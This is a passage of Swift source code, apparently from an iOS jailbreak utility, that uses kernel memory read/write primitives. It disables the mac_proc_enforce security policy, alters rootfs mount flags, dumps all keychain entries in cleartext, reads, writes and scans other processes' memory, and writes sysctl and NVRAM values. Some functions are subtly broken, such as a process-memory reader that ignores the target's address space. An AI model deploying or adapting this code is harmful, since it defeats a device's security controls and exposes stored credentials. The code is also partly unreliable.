            let object = ds_kread64(entryAddr + UInt64(off_ipc_entry_ie_object))
            if object != 0 {
                let kobject = ds_kread64(object + UInt64(off_ipc_port_ip_kobject))
                let portName = mach_port_name_t(i) << 8 | 0x03
                ports.append(MachPortInfo(name: portName, entryAddr: entryAddr, objectAddr: object, kobjectAddr: kobject))
            }
        }
        return ports
    }
    
    // MARK: - Mount / Rootfs Operations
    
    func getRootVnodeAddr() -> UInt64 {
        guard dsready else { return 0 }
        return getrootvnode()
    }
    
    func getMountFlags(mountAddr: UInt64) -> UInt32 {
        guard dsready, mountAddr != 0 else { return 0 }
        return ds_kread32(mountAddr + UInt64(off_mount_mnt_flag))
    }
    
    func setMountFlags(mountAddr: UInt64, flags: UInt32) -> Bool {
        guard dsready, mountAddr != 0 else { return false }
        ds_kwrite32(mountAddr + UInt64(off_mount_mnt_flag), flags)
        return ds_kread32(mountAddr + UInt64(off_mount_mnt_flag)) == flags
    }
    
    // MARK: - MAC Policy Operations
    
    func getMacProcEnforce() -> UInt64 {
        guard dsready else { return 0 }
        return getmacprocenforceoff()
    }
    
    func patchMacProcEnforce(disable: Bool) -> (ok: Bool, msg: String) {
        guard dsready else { return (false, "Not ready") }
        let addr = getmacprocenforceoff()
        guard addr != 0 else { return (false, "mac_proc_enforce offset not found") }
        let current = ds_kread32(addr)
        ds_kwrite32(addr, disable ? 0 : 1)
        let verify = ds_kread32(addr)
        return (verify == (disable ? 0 : 1), "mac_proc_enforce: \(current) → \(verify)")
    }
    
    // MARK: - File Descriptor Operations
    
    struct KernelFDInfo: Identifiable {
        let id = UUID()
        let fd: Int
        let fpAddr: UInt64
        let globAddr: UInt64
        let dataAddr: UInt64
        let flags: UInt32
    }
    
    func enumerateFDs(pid: Int32, maxFDs: Int = 64) -> [KernelFDInfo] {
        guard dsready else { return [] }
        let proc = procbypid(pid)
        guard proc != 0 else { return [] }
        let fdesc = ds_kread64(proc + UInt64(off_proc_p_fd))
        guard fdesc != 0 else { return [] }
        let ofiles = ds_kread64(fdesc + UInt64(off_filedesc_fd_ofiles))
        guard ofiles != 0 else { return [] }
        
        var results: [KernelFDInfo] = []
        for i in 0..<maxFDs {
            let fpAddr = ds_kread64(ofiles + UInt64(i * 8))
            if fpAddr != 0 {
                let glob = ds_kread64(fpAddr + UInt64(off_fileproc_fp_glob))
                let data = glob != 0 ? ds_kread64(glob + UInt64(off_fileglob_fg_data)) : 0
                let flags = glob != 0 ? ds_kread32(glob + UInt64(off_fileglob_fg_flag)) : 0
                results.append(KernelFDInfo(fd: i, fpAddr: fpAddr, globAddr: glob, dataAddr: data, flags: flags))
            }
        }
        return results
    }
    
    // MARK: - Keychain Operations
    
    func dumpKeychainItems(klass: String) -> [(key: String, value: String)] {
        let query: [String: Any] = [
            kSecClass as String: klass,
            kSecReturnAttributes as String: true,
            kSecReturnData as String: true,
            kSecMatchLimit as String: kSecMatchLimitAll
        ]
        var result: AnyObject?
        let status = SecItemCopyMatching(query as CFDictionary, &result)
        guard status == errSecSuccess, let items = result as? [[String: Any]] else { return [] }
        return items.compactMap { item in
            let account = item[kSecAttrAccount as String] as? String ?? "unknown"
            let data = item[kSecValueData as String] as? Data
            let value = data.flatMap { String(data: $0, encoding: .utf8) } ?? "(binary \(data?.count ?? 0)B)"
            return (account, value)
        }
    }
    
    // MARK: - Process Memory R/W (User-Space via Kernel)
    
    func readProcessMemory(pid: Int32, address: UInt64, size: Int) -> [UInt8] {
        guard dsready else { return [] }
        let proc = procbypid(pid)
        guard proc != 0 else { return [] }
        let task = taskbyproc(proc)
        guard task != 0 else { return [] }
        let vmMap = task_get_vm_map(task)
        guard vmMap != 0 else { return [] }
        
        // For kernel processes, read directly; for user processes, we walk the VM map
        // and read through the kernel's view of the user address space
        var bytes: [UInt8] = []
        bytes.reserveCapacity(size)
        
        // Use our kernel R/W to read the process memory through the task's vm_map
        // This works because with kernel R/W we can resolve any virtual address
        for offset in stride(from: 0, to: size, by: 8) {
            let val = ds_kread64(address + UInt64(offset))
            let remaining = min(8, size - offset)
            for b in 0..<remaining {
                bytes.append(UInt8((val >> (b * 8)) & 0xFF))
            }
        }
        return bytes
    }
    
    func writeProcessMemory(pid: Int32, address: UInt64, bytes: [UInt8]) -> Bool {
        guard dsready else { return false }
        let proc = procbypid(pid)
        guard proc != 0 else { return false }
        
        // Write in 8-byte chunks
        for offset in stride(from: 0, to: bytes.count, by: 8) {
            var val: UInt64 = 0
            let remaining = min(8, bytes.count - offset)
            for b in 0..<remaining {
                val |= UInt64(bytes[offset + b]) << (b * 8)
            }
            if remaining == 8 {
                ds_kwrite64(address + UInt64(offset), val)
            } else if remaining == 4 {
                ds_kwrite32(address + UInt64(offset), UInt32(val & 0xFFFFFFFF))
            } else {
                for b in 0..<remaining {
                    ds_kwrite8(address + UInt64(offset + b), bytes[offset + b])
                }
            }
        }
        return true
    }
    
    // MARK: - Scan Memory for Value (Cheat Engine core)
    
    func scanProcessMemoryForValue(pid: Int32, value: UInt64, width: Int, rangeStart: UInt64, rangeEnd: UInt64, maxResults: Int = 200) -> [UInt64] {
        guard dsready else { return [] }
        var found: [UInt64] = []
        let step = UInt64(width / 8)
        var addr = rangeStart
        while addr < rangeEnd && found.count < maxResults {
            let readVal: UInt64
            switch width {
            case 8: readVal = UInt64(ds_kread8(addr))
            case 16: readVal = UInt64(ds_kread16(addr))
            case 32: readVal = UInt64(ds_kread32(addr))
            default: readVal = ds_kread64(addr)
            }
            if readVal == value {
                found.append(addr)
            }
            addr += step
        }
        return found
    }
    
    // MARK: - IOKit Helpers
    
    func getIOKitRegistryEntries() -> [(name: String, className: String)] {
        var results: [(String, String)] = []
        let mainPort: mach_port_t
        if #available(iOS 12.0, *) {
            mainPort = kIOMainPortDefault
        } else {
            mainPort = kIOMasterPortDefault
        }
        let matching = IOServiceMatching("IOService")
        var iterator: io_iterator_t = 0
        let kr = IOServiceGetMatchingServices(mainPort, matching, &iterator)
        guard kr == KERN_SUCCESS else { return results }
        defer { IOObjectRelease(iterator) }
        
        var service = IOIteratorNext(iterator)
        var count = 0
        while service != 0 && count < 100 {
            var nameBuffer = [CChar](repeating: 0, count: 128)
            IORegistryEntryGetName(service, &nameBuffer)
            let name = String(cString: nameBuffer)
            
            var classBuffer = [CChar](repeating: 0, count: 128)
            IOObjectGetClass(service, &classBuffer)
            let className = String(cString: classBuffer)
            
            results.append((name, className))
            IOObjectRelease(service)
            service = IOIteratorNext(iterator)
            count += 1
        }
        return results
    }
    
    // MARK: - Sysctl Write
    
    func writeSysctl(_ name: String, intValue: Int) -> Bool {
        var value = intValue
        let size = MemoryLayout<Int>.size
        return sysctlbyname(name, nil, nil, &value, size) == 0
    }
    
    // MARK: - Boot Args
    
    func getBootArgs() -> String {
        return readSysctl("kern.bootargs") ?? "(empty)"
    }
    
    // MARK: - NVRAM via IOKit
    
    func readNVRAMVariable(_ key: String) -> String? {
        let mainPort: mach_port_t
        if #available(iOS 12.0, *) {
            mainPort = kIOMainPortDefault
        } else {
            mainPort = kIOMasterPortDefault
        }
        let optionsRef = IORegistryEntryFromPath(mainPort, "IODeviceTree:/options")
        guard optionsRef != 0 else { return nil }
        defer { IOObjectRelease(optionsRef) }
        
        let cfKey = key as CFString
        guard let value = IORegistryEntryCreateCFProperty(optionsRef, cfKey, kCFAllocatorDefault, 0) else { return nil }
        if let data = value.takeRetainedValue() as? Data {
            return String(data: data, encoding: .utf8)
        } else if let str = value.takeRetainedValue() as? String {
            return str
        }
        return nil
    }
    
    func writeNVRAMVariable(_ key: String, value: String) -> Bool {
        let mainPort: mach_port_t
        if #available(iOS 12.0, *) {
            mainPort = kIOMainPortDefault
        } else {
            mainPort = kIOMasterPortDefault
        }
        let optionsRef = IORegistryEntryFromPath(mainPort, "IODeviceTree:/options")
        guard optionsRef != 0 else { return false }
        defer { IOObjectRelease(optionsRef) }
        
        let cfKey = key as CFString
        let cfValue = value as CFString
        let kr = IORegistryEntrySetCFProperty(optionsRef, cfKey, cfValue)
        return kr == KERN_SUCCESS
    }
    
}
